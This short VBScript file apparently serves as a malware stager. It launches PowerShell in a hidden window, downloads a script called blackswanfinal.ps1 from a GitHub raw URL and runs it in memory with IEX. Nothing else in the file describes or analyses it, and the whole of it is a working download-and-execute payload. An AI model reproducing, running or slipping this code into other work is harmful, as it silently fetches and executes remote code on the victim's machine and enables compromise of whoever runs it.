Set a1 = CreateObject("Wscript.Shell")
a1.Run ("powershell IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/blackswanfinal.ps1')"), 0, False
